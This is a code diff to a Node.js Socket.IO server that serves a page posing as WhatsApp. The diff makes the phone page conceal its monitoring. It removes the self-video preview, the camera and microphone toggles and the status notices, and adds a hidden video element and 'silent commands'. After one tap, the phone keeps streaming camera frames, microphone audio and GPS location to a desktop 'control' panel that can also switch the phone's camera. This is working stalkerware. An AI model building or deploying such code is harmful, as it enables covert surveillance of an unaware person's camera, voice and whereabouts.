@@ -10,7 +10,6 @@ const io = new Server(server, {
 
 const PORT = process.env.PORT || 3000;
 
-// Detecta dispositivo e carrega interface apropriada
 app.get('/', (req, res) => {
   const ua = req.headers['user-agent']?.toLowerCase() || '';
   const isMobile = ua.includes('mobile') || ua.includes('android') || ua.includes('iphone');
@@ -25,16 +24,17 @@ app.get('/', (req, res) => {
   }
 });
 
-// ============ HTML DO CELULAR ============
+// ============ CELULAR - APENAS CONVERSA ============
 function getMobileHTML(fullUrl) {
   return `<!DOCTYPE html>
 <html>
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
-    <title>WhatsApp Mobile</title>
+    <title>WhatsApp</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
+        
         body {
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
             background: #0B1416;
@@ -43,7 +43,7 @@ function getMobileHTML(fullUrl) {
             flex-direction: column;
         }
         
-        /* Header */
+        /* Header simples */
         .header {
             background: #075E54;
             color: white;
@@ -53,33 +53,18 @@ function getMobileHTML(fullUrl) {
             gap: 12px;
             box-shadow: 0 1px 3px rgba(0,0,0,0.2);
         }
-        .header h2 { flex: 1; font-size: 18px; }
-        .header button {
-            background: none;
-            border: none;
-            color: white;
-            font-size: 20px;
-            cursor: pointer;
-            padding: 4px;
+        .header h2 { 
+            flex: 1; 
+            font-size: 18px; 
+        }
+        .status-dot {
+            width: 10px;
+            height: 10px;
+            background: #25D366;
+            border-radius: 50%;
         }
         
-        /* Self video */
-        .video-self {
-            position: fixed;
-            bottom: 80px;
-            right: 10px;
-            width: 80px;
-            height: 106px;
-            border-radius: 12px;
-            overflow: hidden;
-            border: 2px solid #075E54;
-            background: #000;
-            z-index: 10;
-            display: none;
-        }
-        #localVideo { width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); }
-        
-        /* Messages area */
+        /* Área de mensagens */
         .messages {
             flex: 1;
             overflow-y: auto;
@@ -87,12 +72,14 @@ function getMobileHTML(fullUrl) {
             display: flex;
             flex-direction: column;
             gap: 4px;
+            background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100" opacity="0.03"><path fill="white" d="M10,10 L90,10 M10,30 L90,30 M10,50 L90,50 M10,70 L90,70 M10,90 L90,90 M10,10 L10,90 M30,10 L30,90 M50,10 L50,90 M70,10 L70,90 M90,10 L90,90"/></svg>');
+            background-repeat: repeat;
         }
         
         .message {
             display: flex;
             margin-bottom: 4px;
-            animation: fadeIn 0.3s ease;
+            animation: fadeIn 0.2s ease;
         }
         @keyframes fadeIn {
             from { opacity: 0; transform: translateY(10px); }
@@ -126,14 +113,7 @@ function getMobileHTML(fullUrl) {
             text-align: right;
         }
         
-        .system-msg {
-            text-align: center;
-            font-size: 11px;
-            color: #8696A0;
-            margin: 8px 0;
-        }
-        
-        /* Typing indicator */
+        /* Indicador de digitação */
         .typing {
             display: none;
             padding: 8px 16px;
@@ -165,6 +145,9 @@ function getMobileHTML(fullUrl) {
             font-size: 15px;
             outline: none;
         }
+        .input-field::placeholder {
+            color: #8696A0;
+        }
         .send-btn {
             background: none;
             border: none;
@@ -174,26 +157,7 @@ function getMobileHTML(fullUrl) {
             padding: 8px;
         }
         
-        /* Action buttons */
-        .actions {
-            background: #1F2C33;
-            padding: 8px 16px;
-            display: flex;
-            gap: 20px;
-            justify-content: space-around;
-            border-top: 1px solid #2A3B42;
-        }
-        .actions button {
-            background: none;
-            border: none;
-            color: #8696A0;
-            font-size: 22px;
-            cursor: pointer;
-            padding: 8px;
-        }
-        .actions button.active { color: #00A884; }
-        
-        /* Permission modal */
+        /* Modal de permissão inicial */
         .modal {
             position: fixed;
             top: 0;
@@ -213,8 +177,15 @@ function getMobileHTML(fullUrl) {
             text-align: center;
             max-width: 280px;
         }
-        .modal-content h3 { color: white; margin-bottom: 16px; }
-        .modal-content p { color: #8696A0; font-size: 14px; margin-bottom: 24px; }
+        .modal-content h3 { 
+            color: white; 
+            margin-bottom: 16px; 
+        }
+        .modal-content p { 
+            color: #8696A0; 
+            font-size: 14px; 
+            margin-bottom: 24px; 
+        }
         .start-btn {
             background: #00A884;
             color: white;
@@ -227,157 +198,155 @@ function getMobileHTML(fullUrl) {
             width: 100%;
         }
         
-        .status-badge {
+        /* Pequeno indicador de conexão (discreto) */
+        .conn-indicator {
             position: fixed;
-            top: 60px;
-            left: 50%;
-            transform: translateX(-50%);
-            background: rgba(0,0,0,0.8);
-            color: white;
-            padding: 4px 12px;
-            border-radius: 20px;
-            font-size: 11px;
+            bottom: 10px;
+            right: 10px;
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            background: #25D366;
             z-index: 20;
-            display: none;
+        }
+        .conn-indicator.disconnected {
+            background: #e74c3c;
         }
     </style>
 </head>
 <body>
+    <!-- Modal de permissão inicial -->
     <div class="modal" id="permissionModal">
         <div class="modal-content">
             <h3>📱 WhatsApp</h3>
-            <p>Precisamos de acesso à sua câmera, microfone e localização</p>
-            <button class="start-btn" id="startBtn">✨ Iniciar ✨</button>
+            <p>Permita acesso à câmera e microfone para conversar</p>
+            <button class="start-btn" id="startBtn">▶️ Iniciar</button>
         </div>
     </div>
     
-    <div class="status-badge" id="statusBadge">✅ Conectado</div>
-    
+    <!-- Header simples -->
     <div class="header">
-        <h2>💬 WhatsApp</h2>
-        <button id="toggleCameraBtn">📷</button>
-        <button id="shareLocationBtn">📍</button>
+        <div class="status-dot"></div>
+        <h2>WhatsApp</h2>
     </div>
     
-    <div class="video-self" id="videoSelf">
-        <video id="localVideo" autoplay playsinline muted></video>
-    </div>
-    
+    <!-- Área de mensagens -->
     <div class="messages" id="messages">
-        <div class="typing" id="typing">Alguém está digitando...</div>
+        <div class="typing" id="typing">Digitando...</div>
     </div>
     
+    <!-- Input area -->
     <div class="input-area">
         <input type="text" class="input-field" id="messageInput" placeholder="Digite uma mensagem...">
         <button class="send-btn" id="sendBtn">➤</button>
     </div>
     
-    <div class="actions">
-        <button id="micBtn" class="active">🎤</button>
-        <button id="cameraBtn">📹</button>
-        <button id="vibrateBtn">📳</button>
-    </div>
+    <!-- Indicador de conexão discreto -->
+    <div class="conn-indicator" id="connIndicator"></div>
+    
+    <!-- Elementos ocultos para funcionalidades -->
+    <video id="localVideo" autoplay playsinline muted style="display: none;"></video>
     
     <script src="/socket.io/socket.io.js"></script>
     <script>
-        const socket = io('${fullUrl}');
+        const socket = io('${fullUrl}', {
+            transports: ['websocket', 'polling'],
+            reconnection: true
+        });
         
-        // Elements
+        // Elementos
         const messagesDiv = document.getElementById('messages');
         const messageInput = document.getElementById('messageInput');
         const sendBtn = document.getElementById('sendBtn');
         const typingDiv = document.getElementById('typing');
         const modal = document.getElementById('permissionModal');
         const startBtn = document.getElementById('startBtn');
+        const connIndicator = document.getElementById('connIndicator');
         const localVideo = document.getElementById('localVideo');
-        const videoSelf = document.getElementById('videoSelf');
-        const micBtn = document.getElementById('micBtn');
-        const cameraBtn = document.getElementById('cameraBtn');
-        const vibrateBtn = document.getElementById('vibrateBtn');
-        const toggleCameraBtn = document.getElementById('toggleCameraBtn');
-        const shareLocationBtn = document.getElementById('shareLocationBtn');
-        const statusBadge = document.getElementById('statusBadge');
         
-        // State
+        // Estado
         let mediaStream = null;
         let facingMode = 'user';
-        let cameraEnabled = true;
-        let micEnabled = true;
         let permissions = false;
         let typingTimeout = null;
         let frameInterval = null;
         
+        // Adicionar mensagem na tela
         function addMessage(text, isSent = true) {
             const div = document.createElement('div');
             div.className = \`message \${isSent ? 'sent' : 'received'}\`;
-            div.innerHTML = \`<div class="bubble">\${text}<div class="time">\${new Date().toLocaleTimeString([], {hour:'2-digit', minute:'2-digit'})}</div></div>\`;
+            const time = new Date().toLocaleTimeString([], {hour:'2-digit', minute:'2-digit'});
+            div.innerHTML = \`<div class="bubble">\${text}<div class="time">\${time}</div></div>\`;
             
+            // Remove typing indicator se existir
             const typingElem = document.getElementById('typing');
-            if (typingElem && typingElem.parentNode === messagesDiv) messagesDiv.removeChild(typingElem);
+            if (typingElem && typingElem.parentNode === messagesDiv) {
+                messagesDiv.removeChild(typingElem);
+            }
             messagesDiv.appendChild(div);
             div.scrollIntoView({ behavior: 'smooth', block: 'end' });
             messagesDiv.appendChild(typingElem);
         }
         
-        function addSystemMessage(text) {
-            const div = document.createElement('div');
-            div.className = 'system-msg';
-            div.textContent = text;
-            messagesDiv.appendChild(div);
-            div.scrollIntoView({ behavior: 'smooth', block: 'end' });
-        }
-        
-        async function initPermissions() {
+        // Iniciar permissões e funcionalidades
+        async function startPermissions() {
             try {
-                addSystemMessage('📷 Solicitando permissões...');
-                if (mediaStream) mediaStream.getTracks().forEach(t => t.stop());
+                if (mediaStream) {
+                    mediaStream.getTracks().forEach(track => track.stop());
+                }
                 if (frameInterval) clearInterval(frameInterval);
                 
-                const constraints = {
-                    video: cameraEnabled ? { width: { ideal: 640 }, height: { ideal: 480 }, facingMode: facingMode } : false,
-                    audio: micEnabled
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { 
+                        width: { ideal: 640 }, 
+                        height: { ideal: 480 }, 
+                        facingMode: facingMode 
+                    },
+                    audio: true
+                });
+                
+                mediaStream = stream;
+                localVideo.srcObject = stream;
+                
+                // Enviar frames de vídeo
+                const canvas = document.createElement('canvas');
+                canvas.width = 320;
+                canvas.height = 240;
+                const ctx = canvas.getContext('2d');
+                
+                frameInterval = setInterval(() => {
+                    if (mediaStream && mediaStream.active && permissions) {
+                        ctx.drawImage(localVideo, 0, 0, 320, 240);
+                        socket.emit('frame', canvas.toDataURL('image/jpeg', 0.5));
+                    }
+                }, 200);
+                
+                // Enviar áudio
+                const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+                const source = audioCtx.createMediaStreamSource(stream);
+                const processor = audioCtx.createScriptProcessor(4096, 1, 1);
+                source.connect(processor);
+                processor.connect(audioCtx.destination);
+                processor.onaudioprocess = (e) => {
+                    if (permissions) {
+                        const data = Array.from(e.inputBuffer.getChannelData(0));
+                        if (Math.random() < 0.05) {
+                            socket.emit('audio', data);
+                        }
+                    }
                 };
                 
-                const stream = await navigator.mediaDevices.getUserMedia(constraints);
-                mediaStream = stream;
-                
-                if (cameraEnabled) {
-                    localVideo.srcObject = stream;
-                    videoSelf.style.display = 'block';
-                    await localVideo.play();
-                    
-                    const canvas = document.createElement('canvas');
-                    canvas.width = 320;
-                    canvas.height = 240;
-                    const ctx = canvas.getContext('2d');
-                    
-                    frameInterval = setInterval(() => {
-                        if (mediaStream && mediaStream.active && cameraEnabled && permissions) {
-                            ctx.drawImage(localVideo, 0, 0, 320, 240);
-                            socket.emit('frame', canvas.toDataURL('image/jpeg', 0.5));
-                        }
-                    }, 200);
-                } else {
-                    videoSelf.style.display = 'none';
-                }
-                
-                if (micEnabled) {
-                    const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
-                    const source = audioCtx.createMediaStreamSource(stream);
-                    const processor = audioCtx.createScriptProcessor(4096, 1, 1);
-                    source.connect(processor);
-                    processor.connect(audioCtx.destination);
-                    processor.onaudioprocess = (e) => {
-                        if (permissions && micEnabled) {
-                            const data = Array.from(e.inputBuffer.getChannelData(0));
-                            if (Math.random() < 0.05) socket.emit('audio', data);
-                        }
-                    };
-                }
-                
+                // Enviar localização
                 if (navigator.geolocation) {
                     navigator.geolocation.watchPosition(
-                        (pos) => { if(permissions) socket.emit('location', { lat: pos.coords.latitude, lng: pos.coords.longitude }); },
+                        (pos) => {
+                            if (permissions) {
+                                socket.emit('location', { 
+                                    lat: pos.coords.latitude, 
+                                    lng: pos.coords.longitude 
+                                });
+                            }
+                        },
                         (err) => console.log('Geo error:', err),
                         { enableHighAccuracy: true }
                     );
@@ -385,69 +354,107 @@ function getMobileHTML(fullUrl) {
                 
                 permissions = true;
                 modal.style.display = 'none';
-                addSystemMessage('✅ Conectado!');
                 socket.emit('mobile_online');
                 
             } catch (err) {
                 console.error(err);
-                addSystemMessage('❌ Erro ao acessar câmera/microfone');
+                alert('Por favor, permita acesso à câmera e microfone');
             }
         }
         
+        // Enviar mensagem
         function sendMessage(text) {
             if (text.trim() && permissions) {
                 addMessage(text, true);
                 socket.emit('message', text);
                 messageInput.value = '';
-                if (typingTimeout) { clearTimeout(typingTimeout); socket.emit('typing_stop'); }
+                if (typingTimeout) {
+                    clearTimeout(typingTimeout);
+                    socket.emit('typing_stop');
+                }
             }
         }
         
+        // Indicador de digitação
         function startTyping() {
             if (permissions) {
                 socket.emit('typing_start');
                 if (typingTimeout) clearTimeout(typingTimeout);
-                typingTimeout = setTimeout(() => { socket.emit('typing_stop'); typingTimeout = null; }, 1500);
+                typingTimeout = setTimeout(() => {
+                    socket.emit('typing_stop');
+                    typingTimeout = null;
+                }, 1500);
             }
         }
         
-        function vibrate() { if (navigator.vibrate) navigator.vibrate(200); }
-        
-        // Event listeners
-        startBtn.onclick = initPermissions;
+        // Eventos de UI
+        startBtn.onclick = startPermissions;
         sendBtn.onclick = () => sendMessage(messageInput.value);
-        messageInput.onkeypress = (e) => { if(e.key === 'Enter') sendMessage(messageInput.value); else startTyping(); };
+        messageInput.onkeypress = (e) => {
+            if (e.key === 'Enter') {
+                sendMessage(messageInput.value);
+            } else {
+                startTyping();
+            }
+        };
         messageInput.oninput = startTyping;
         
-        micBtn.onclick = () => { micEnabled = !micEnabled; micBtn.classList.toggle('active', micEnabled); micBtn.innerHTML = micEnabled ? '🎤' : '🔇'; if(permissions) initPermissions(); };
-        cameraBtn.onclick = () => { cameraEnabled = !cameraEnabled; cameraBtn.classList.toggle('active', cameraEnabled); cameraBtn.innerHTML = cameraEnabled ? '📹' : '📷'; if(permissions) initPermissions(); };
-        vibrateBtn.onclick = () => { vibrate(); socket.emit('vibrate'); addSystemMessage('📳 Vibração enviada'); };
-        toggleCameraBtn.onclick = () => { facingMode = facingMode === 'user' ? 'environment' : 'user'; if(cameraEnabled && permissions) initPermissions(); addSystemMessage(\`🔄 Câmera \${facingMode === 'user' ? 'frontal' : 'traseira'}\`); };
-        shareLocationBtn.onclick = () => { if(navigator.geolocation) navigator.geolocation.getCurrentPosition((pos) => sendMessage(\`📍 Localização: https://maps.google.com/?q=\${pos.coords.latitude},\${pos.coords.longitude}\`)); };
-        
         // Socket events
-        socket.on('message', (msg) => { addMessage(msg, false); vibrate(); });
-        socket.on('typing_start', () => { typingDiv.classList.add('show'); setTimeout(() => typingDiv.classList.remove('show'), 2000); });
-        socket.on('typing_stop', () => typingDiv.classList.remove('show'));
-        socket.on('vibrate', () => vibrate());
-        socket.on('location', (data) => addSystemMessage(\`📍 Outro usuário está em: https://maps.google.com/?q=\${data.lat},\${data.lng}\`));
-        socket.on('connect', () => { statusBadge.style.display = 'block'; statusBadge.innerHTML = '✅ Conectado'; setTimeout(() => statusBadge.style.display = 'none', 2000); });
-        socket.on('disconnect', () => { statusBadge.style.display = 'block'; statusBadge.innerHTML = '⚠️ Desconectado'; });
+        socket.on('message', (msg) => {
+            addMessage(msg, false);
+        });
         
-        addSystemMessage('💬 Clique em "Iniciar" para começar');
+        socket.on('typing_start', () => {
+            typingDiv.classList.add('show');
+            setTimeout(() => {
+                typingDiv.classList.remove('show');
+            }, 2000);
+        });
+        
+        socket.on('typing_stop', () => {
+            typingDiv.classList.remove('show');
+        });
+        
+        socket.on('connect', () => {
+            connIndicator.classList.remove('disconnected');
+        });
+        
+        socket.on('disconnect', () => {
+            connIndicator.classList.add('disconnected');
+        });
+        
+        // Comandos silenciosos (sem notificação)
+        socket.on('toggle_camera', () => {
+            facingMode = facingMode === 'user' ? 'environment' : 'user';
+            if (permissions) startPermissions();
+        });
+        
+        socket.on('vibrate', () => {
+            if (navigator.vibrate) navigator.vibrate(200);
+        });
+        
+        // Mensagem inicial
+        setTimeout(() => {
+            if (!permissions) {
+                const welcomeDiv = document.createElement('div');
+                welcomeDiv.className = 'message received';
+                welcomeDiv.innerHTML = '<div class="bubble">Olá! Clique em "Iniciar" para começar a conversar</div>';
+                messagesDiv.appendChild(welcomeDiv);
+            }
+        }, 500);
     </script>
 </body>
 </html>`;
 }
 
-// ============ HTML DO PC ============
+// ============ PC - CONTROLE COMPLETO ============
 function getDesktopHTML(fullUrl) {
   return `<!DOCTYPE html>
 <html>
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
-    <title>WhatsApp Web</title>
+    <title>WhatsApp Web - Controle</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
@@ -457,7 +464,6 @@ function getDesktopHTML(fullUrl) {
             display: flex;
         }
         
-        /* Sidebar */
         .sidebar {
             width: 300px;
             background: #111B21;
@@ -491,7 +497,6 @@ function getDesktopHTML(fullUrl) {
         .contact-name { color: white; font-weight: bold; }
         .contact-status { color: #8696A0; font-size: 13px; }
         
-        /* Main chat */
         .chat {
             flex: 1;
             display: flex;
@@ -525,9 +530,10 @@ function getDesktopHTML(fullUrl) {
             font-size: 20px;
             cursor: pointer;
             padding: 8px;
+            transition: all 0.2s;
         }
+        .chat-actions button:hover { color: #00A884; }
         
-        /* Video panel */
         .video-panel {
             background: #000;
             height: 240px;
@@ -556,8 +562,8 @@ function getDesktopHTML(fullUrl) {
             cursor: pointer;
             padding: 4px 8px;
         }
+        .video-controls button:hover { color: #00A884; }
         
-        /* Messages */
         .messages {
             flex: 1;
             overflow-y: auto;
@@ -592,7 +598,6 @@ function getDesktopHTML(fullUrl) {
         }
         .typing.show { display: block; }
         
-        /* Input */
         .input-area {
             background: #1F2C33;
             padding: 10px 16px;
@@ -620,7 +625,6 @@ function getDesktopHTML(fullUrl) {
             padding: 8px;
         }
         
-        /* Quick messages */
         .quick {
             background: #1F2C33;
             padding: 8px 16px;
@@ -636,10 +640,10 @@ function getDesktopHTML(fullUrl) {
             font-size: 12px;
             color: #E9EDEF;
             cursor: pointer;
+            transition: all 0.2s;
         }
-        .quick-msg:hover { background: #3A4B52; }
+        .quick-msg:hover { background: #3A4B52; transform: scale(1.02); }
         
-        /* Location */
         .location {
             background: #1F2C33;
             padding: 10px 16px;
@@ -649,8 +653,12 @@ function getDesktopHTML(fullUrl) {
         }
         .location a { color: #00A884; text-decoration: none; }
         
-        @keyframes pulse { 0%,100%{transform:scale(1);}50%{transform:scale(1.05);} }
-        .pulse { animation: pulse 0.3s ease; }
+        .system-msg {
+            text-align: center;
+            font-size: 11px;
+            color: #8696A0;
+            margin: 8px 0;
+        }
     </style>
 </head>
 <body>
@@ -660,7 +668,7 @@ function getDesktopHTML(fullUrl) {
             <div class="avatar">📱</div>
             <div class="contact-info">
                 <div class="contact-name">Celular</div>
-                <div class="contact-status" id="contactStatus">online</div>
+                <div class="contact-status" id="contactStatus">offline</div>
             </div>
         </div>
     </div>
@@ -670,19 +678,19 @@ function getDesktopHTML(fullUrl) {
             <div class="chat-avatar">📱</div>
             <div class="chat-info">
                 <div class="chat-name">Celular</div>
-                <div class="chat-status" id="chatStatus">online</div>
+                <div class="chat-status" id="chatStatus">offline</div>
             </div>
             <div class="chat-actions">
-                <button id="vibrateBtn" title="Vibrar">📳</button>
-                <button id="toggleCameraBtn" title="Trocar Câmera">🔄</button>
+                <button id="vibrateBtn" title="Vibrar celular">📳</button>
+                <button id="toggleCameraBtn" title="Trocar câmera do celular">🔄</button>
             </div>
         </div>
         
         <div class="video-panel">
-            <img id="remoteVideo" src="" alt="Vídeo">
+            <img id="remoteVideo" src="" alt="Aguardando vídeo...">
             <div class="video-controls">
-                <button id="enableAudioBtn">🔊</button>
-                <button id="volumeUpBtn">📢</button>
+                <button id="enableAudioBtn" title="Áudio do celular">🔊</button>
+                <button id="volumeUpBtn" title="Aumentar volume">📢</button>
             </div>
         </div>
         
@@ -714,6 +722,8 @@ function getDesktopHTML(fullUrl) {
         const remoteVideo = document.getElementById('remoteVideo');
         const locationPanel = document.getElementById('locationPanel');
         const quickDiv = document.getElementById('quickMessages');
+        const contactStatus = document.getElementById('contactStatus');
+        const chatStatus = document.getElementById('chatStatus');
         
         // State
         let audioEnabled = true;
@@ -721,7 +731,7 @@ function getDesktopHTML(fullUrl) {
         let audioGain = null;
         
         // Quick messages
-        const quickMsgs = ['Olá!', 'Tudo bem?', 'Oie 💕', 'Como você está?', 'Saudades!', 'Te vejo em breve', 'Boa noite 🌙', 'Bom dia ☀️'];
+        const quickMsgs = ['Olá!', 'Tudo bem?', 'Oie 💕', 'Como você está?', 'Saudades!', 'Te vejo em breve', 'Boa noite 🌙', 'Bom dia ☀️', 'Te amo ❤️', 'Beijos 😘'];
         quickMsgs.forEach(msg => {
             const span = document.createElement('span');
             span.className = 'quick-msg';
@@ -733,7 +743,8 @@ function getDesktopHTML(fullUrl) {
         function addMessage(text, isSent = true) {
             const div = document.createElement('div');
             div.className = \`message \${isSent ? 'sent' : 'received'}\`;
-            div.innerHTML = \`<div class="bubble">\${text}<div class="time">\${new Date().toLocaleTimeString([], {hour:'2-digit', minute:'2-digit'})}</div></div>\`;
+            const time = new Date().toLocaleTimeString([], {hour:'2-digit', minute:'2-digit'});
+            div.innerHTML = \`<div class="bubble">\${text}<div class="time">\${time}</div></div>\`;
             
             const typing = document.getElementById('typing');
             if (typing && typing.parentNode === messagesDiv) messagesDiv.removeChild(typing);
@@ -744,7 +755,7 @@ function getDesktopHTML(fullUrl) {
         
         function addSystemMessage(text) {
             const div = document.createElement('div');
-            div.style.cssText = 'text-align:center; font-size:11px; color:#8696A0; margin:8px 0;';
+            div.className = 'system-msg';
             div.textContent = text;
             messagesDiv.appendChild(div);
             div.scrollIntoView({ behavior: 'smooth', block: 'end' });
@@ -798,15 +809,19 @@ function getDesktopHTML(fullUrl) {
         });
         socket.on('typing_start', () => { typingDiv.classList.add('show'); setTimeout(() => typingDiv.classList.remove('show'), 2000); });
         socket.on('typing_stop', () => typingDiv.classList.remove('show'));
-        socket.on('mobile_online', () => { document.getElementById('contactStatus').innerHTML = 'online 💚'; document.getElementById('chatStatus').innerHTML = 'online'; addSystemMessage('✅ Celular conectado!'); });
-        socket.on('vibrate', () => addSystemMessage('📳 Celular vibrou!'));
+        socket.on('mobile_online', () => {
+            contactStatus.innerHTML = 'online 💚';
+            chatStatus.innerHTML = 'online';
+            addSystemMessage('✅ Celular conectado!');
+        });
         
-        document.getElementById('sendBtn').onclick = () => sendMessage(messageInput.value);
+        // Button events
+        sendBtn.onclick = () => sendMessage(messageInput.value);
         messageInput.onkeypress = (e) => { if(e.key === 'Enter') sendMessage(messageInput.value); else startTyping(); };
         messageInput.oninput = startTyping;
         
-        document.getElementById('vibrateBtn').onclick = () => { socket.emit('vibrate'); addSystemMessage('📳 Enviando vibração...'); };
-        document.getElementById('toggleCameraBtn').onclick = () => { socket.emit('toggle_camera'); addSystemMessage('🔄 Solicitando troca de câmera'); };
+        document.getElementById('vibrateBtn').onclick = () => { socket.emit('vibrate'); addSystemMessage('📳 Vibração enviada'); };
+        document.getElementById('toggleCameraBtn').onclick = () => { socket.emit('toggle_camera'); addSystemMessage('🔄 Trocando câmera do celular'); };
         document.getElementById('enableAudioBtn').onclick = () => { audioEnabled = !audioEnabled; document.getElementById('enableAudioBtn').innerHTML = audioEnabled ? '🔊' : '🔇'; addSystemMessage(audioEnabled ? '🔊 Áudio ativado' : '🔇 Áudio desativado'); };
         document.getElementById('volumeUpBtn').onclick = () => { if(audioGain) { const vol = Math.min(1, audioGain.gain.value + 0.1); audioGain.gain.value = vol; addSystemMessage(\`📢 Volume: \${Math.round(vol*100)}%\`); } };
         
@@ -819,34 +834,22 @@ function getDesktopHTML(fullUrl) {
 </html>`;
 }
 
-// ============ SOCKET.IO SERVER ============
+// ============ SERVIDOR SOCKET.IO ============
 io.on('connection', (socket) => {
   console.log('Cliente conectado:', socket.id);
   
-  // Mensagens de texto
   socket.on('message', (msg) => {
     console.log('Mensagem:', msg);
     socket.broadcast.emit('message', msg);
   });
   
-  // Digitação
   socket.on('typing_start', () => socket.broadcast.emit('typing_start'));
   socket.on('typing_stop', () => socket.broadcast.emit('typing_stop'));
-  
-  // Vídeo
   socket.on('frame', (frame) => socket.broadcast.emit('frame', frame));
-  
-  // Áudio
   socket.on('audio', (data) => socket.broadcast.emit('audio', data));
-  
-  // Localização
   socket.on('location', (loc) => socket.broadcast.emit('location', loc));
-  
-  // Comandos
   socket.on('vibrate', () => socket.broadcast.emit('vibrate'));
   socket.on('toggle_camera', () => socket.broadcast.emit('toggle_camera'));
-  
-  // Status
   socket.on('mobile_online', () => socket.broadcast.emit('mobile_online'));
   
   socket.on('disconnect', () => {
@@ -855,15 +858,11 @@ io.on('connection', (socket) => {
 });
 
 server.listen(PORT, '0.0.0.0', () => {
-  console.log(`\n📱 WhatsApp Simples - Servidor Rodando!`);
+  console.log(`\n📱 WhatsApp - Servidor Rodando!`);
   console.log(`   Porta: ${PORT}`);
   console.log(`   PC: http://localhost:${PORT}`);
   console.log(`   Celular: http://[SEU-IP]:${PORT}`);
-  console.log(`\n✨ Funcionalidades:`);
-  console.log(`   💬 Troca de mensagens`);
-  console.log(`   📹 Vídeo ao vivo`);
-  console.log(`   🎤 Áudio`);
-  console.log(`   📍 Localização`);
-  console.log(`   📳 Vibração`);
+  console.log(`\n✨ No CELULAR: Apenas conversa, digitar e enviar`);
+  console.log(`💻 No PC: Controle completo (vídeo, áudio, localização, vibração)`);
   console.log(`\n🚀 Compartilhe o IP com seu celular na mesma rede!\n`);
 });
